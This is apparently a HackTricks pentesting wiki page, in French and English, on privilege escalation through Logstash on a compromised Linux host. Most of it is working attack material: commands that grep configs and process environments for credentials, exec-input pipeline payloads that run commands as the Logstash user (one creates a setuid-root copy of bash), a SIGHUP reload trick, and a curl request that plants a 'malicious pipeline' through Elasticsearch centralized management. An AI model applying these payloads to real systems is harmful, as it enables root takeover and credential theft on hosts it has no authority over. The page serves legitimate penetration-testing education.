# Logstash Privilege Escalation

{{#include ../../banners/hacktricks-training.md}}

## Logstash

Logstash est utilisé pour **collecter, transformer et distribuer des logs** via un système connu sous le nom de **pipelines**. Ces pipelines sont composés d'étapes **input**, **filter** et **output**. Un aspect intéressant apparaît lorsque Logstash s'exécute sur une machine compromise.

### Configuration des pipelines

Les pipelines sont configurés dans le fichier **/etc/logstash/pipelines.yml**, qui liste les emplacements des configurations de pipeline :
```yaml
# Define your pipelines here. Multiple pipelines can be defined.
# For details on multiple pipelines, refer to the documentation:
# https://www.elastic.co/guide/en/logstash/current/multiple-pipelines.html

- pipeline.id: main
path.config: "/etc/logstash/conf.d/*.conf"
- pipeline.id: example
path.config: "/usr/share/logstash/pipeline/1*.conf"
pipeline.workers: 6
```
Ce fichier indique où se trouvent les fichiers **.conf**, contenant les configurations de pipeline. Lorsqu'on utilise un **Elasticsearch output module**, il est courant que les **pipelines** contiennent des **Elasticsearch credentials**, qui disposent souvent de privilèges étendus en raison du besoin de Logstash d'écrire des données dans Elasticsearch. Les caractères génériques dans les chemins de configuration permettent à Logstash d'exécuter tous les pipelines correspondants dans le répertoire désigné.

Si Logstash est démarré avec `-f <directory>` au lieu de `pipelines.yml`, **tous les fichiers à l'intérieur de ce répertoire sont concaténés dans l'ordre lexicographique et analysés comme une seule config**. Cela crée 2 implications offensives :

- Un fichier déposé comme `000-input.conf` ou `zzz-output.conf` peut modifier la façon dont le pipeline final est assemblé
- Un fichier malformé peut empêcher le chargement de l'ensemble du pipeline, donc validez soigneusement les payloads avant de compter sur l'auto-reload

### Énumération rapide sur une machine compromise

Sur une machine où Logstash est installé, inspectez rapidement :
```bash
ps aux | grep -i logstash
systemctl cat logstash 2>/dev/null
cat /etc/logstash/pipelines.yml 2>/dev/null
cat /etc/logstash/logstash.yml 2>/dev/null
find /etc/logstash /usr/share/logstash -maxdepth 3 -type f \( -name '*.conf' -o -name 'logstash.yml' -o -name 'pipelines.yml' \) -ls
rg -n --hidden -S 'password|passwd|api[_-]?key|cloud_auth|ssl_keystore_password|truststore_password|user\s*=>|hosts\s*=>' /etc/logstash /usr/share/logstash 2>/dev/null
```
Vérifiez également si l'API locale de monitoring est accessible. Par défaut, elle écoute sur **127.0.0.1:9600**, ce qui suffit généralement une fois que vous êtes sur l'hôte :
```bash
curl -s http://127.0.0.1:9600/?pretty
curl -s http://127.0.0.1:9600/_node/pipelines?pretty
curl -s http://127.0.0.1:9600/_node/stats/pipelines?pretty
```
Cela vous donne généralement les IDs de pipeline, les détails d'exécution et la confirmation que votre pipeline modifié a bien été chargé.

Les identifiants récupérés depuis Logstash débloquent souvent **Elasticsearch**, consultez donc [cette autre page sur Elasticsearch](../../network-services-pentesting/9200-pentesting-elasticsearch.md).

### Privilege Escalation via Writable Pipelines

Pour tenter une privilege escalation, identifiez d'abord l'utilisateur sous lequel le service Logstash s'exécute, typiquement l'utilisateur **logstash**. Assurez-vous de satisfaire **un** des critères suivants :

- Posséder **write access** sur un fichier de pipeline **.conf** **ou**
- Le fichier **/etc/logstash/pipelines.yml** utilise un wildcard, et vous pouvez écrire dans le dossier cible

De plus, **une** de ces conditions doit être remplie :

- Capacité à redémarrer le service Logstash **ou**
- Le fichier **/etc/logstash/logstash.yml** contient **config.reload.automatic: true**

Avec un wildcard dans la configuration, créer un fichier qui correspond à ce wildcard permet l'exécution de commandes. Par exemple :
```bash
input {
exec {
command => "whoami"
interval => 120
}
}

output {
file {
path => "/tmp/output.log"
codec => rubydebug
}
}
```
Here, **interval** determines the execution frequency in seconds. In the given example, the **whoami** command runs every 120 seconds, with its output directed to **/tmp/output.log**.

With **config.reload.automatic: true** in **/etc/logstash/logstash.yml**, Logstash will automatically detect and apply new or modified pipeline configurations without needing a restart. If there's no wildcard, modifications can still be made to existing configurations, but caution is advised to avoid disruptions.

### More Reliable Pipeline Payloads

The `exec` input plugin still works in current releases and requires either an `interval` or a `schedule`. It executes by **forking** the Logstash JVM, so if memory is tight your payload may fail with `ENOMEM` instead of silently running.

A more practical privilege-escalation payload is usually one that leaves a durable artifact:
```bash
input {
exec {
command => "cp /bin/bash /tmp/logroot && chown root:root /tmp/logroot && chmod 4755 /tmp/logroot"
interval => 300
}
}
output {
null {}
}
```
Si vous n'avez pas les droits de redémarrage mais pouvez signaler le processus, Logstash prend également en charge un rechargement déclenché par **SIGHUP** sur les systèmes de type Unix :
```bash
kill -SIGHUP $(pgrep -f logstash)
```
Be aware that not every plugin is reload-friendly. For example, the **stdin** input prevents automatic reload, so don't assume `config.reload.automatic` will always pick up your changes.

### Voler des secrets depuis Logstash

Avant de se concentrer uniquement sur l'exécution de code, récoltez les données auxquelles Logstash a déjà accès :

- Les identifiants en clair sont souvent codés en dur dans les outputs `elasticsearch {}`, `http_poller`, les inputs JDBC, ou les paramètres liés au cloud
- Les paramètres sécurisés peuvent se trouver dans **`/etc/logstash/logstash.keystore`** ou dans un autre répertoire `path.settings`
- Le mot de passe du keystore est souvent fourni via **`LOGSTASH_KEYSTORE_PASS`**, et les installations via package le récupèrent souvent depuis **`/etc/sysconfig/logstash`**
- L'expansion des variables d'environnement avec `${VAR}` est résolue au démarrage de Logstash, donc l'environnement du service mérite d'être inspecté

Vérifications utiles :
```bash
ls -l /etc/logstash /etc/logstash/logstash.keystore 2>/dev/null
strings /etc/logstash/conf.d/*.conf 2>/dev/null | head
tr '\0' '\n' < /proc/$(pgrep -o -f logstash)/environ 2>/dev/null | sort
cat /etc/sysconfig/logstash 2>/dev/null
journalctl -u logstash --no-pager 2>/dev/null | tail -n 200
ls -lah /var/log/logstash 2>/dev/null
```
Ceci vaut aussi la peine d'être vérifié car **CVE-2023-46672** a montré que Logstash pouvait enregistrer des informations sensibles dans les logs dans des circonstances spécifiques. Sur un hôte post-exploitation, d'anciens logs Logstash et des entrées `journald` peuvent donc divulguer des identifiants même si la config actuelle référence le keystore au lieu de stocker les secrets inline.

### Abus de la gestion centralisée des pipelines

Dans certains environnements, l'hôte ne dépend **pas** du tout des fichiers `.conf` locaux. Si **`xpack.management.enabled: true`** est configuré, Logstash peut récupérer des pipelines gérés centralement depuis Elasticsearch/Kibana, et après activation de ce mode les configs de pipeline locales ne sont plus la source de vérité.

Cela implique un chemin d'attaque différent :

1. Récupérer les identifiants Elastic depuis les paramètres locaux de Logstash, le keystore, ou les logs
2. Vérifier si le compte possède le privilège de cluster **`manage_logstash_pipelines`**
3. Créer ou remplacer un pipeline géré centralement afin que l'hôte Logstash exécute votre payload lors de son prochain intervalle de sondage

L'API Elasticsearch utilisée pour cette fonctionnalité est :
```bash
curl -X PUT http://ELASTIC:9200/_logstash/pipeline/pwned \
-H 'Content-Type: application/json' \
-u user:password \
-d '{
"description": "malicious pipeline",
"pipeline": "input { exec { command => \"id > /tmp/.ls-rce\" interval => 120 } } output { null {} }",
"pipeline_metadata": {"type": "logstash_pipeline", "version": "1"},
"pipeline_settings": {"pipeline.workers": 1, "pipeline.batch.size": 1}
}'
```
Ceci est particulièrement utile lorsque les fichiers locaux sont en lecture seule mais que Logstash est déjà configuré pour récupérer des pipelines à distance.

## Références

- [Elastic Docs: Reloading the Config File](https://www.elastic.co/guide/en/logstash/8.19/reloading-config.html)
- [Elastic Docs: Configure Centralized Pipeline Management](https://www.elastic.co/guide/en/logstash/8.19/configuring-centralized-pipelines.html)

{{#include ../../banners/hacktricks-training.md}}
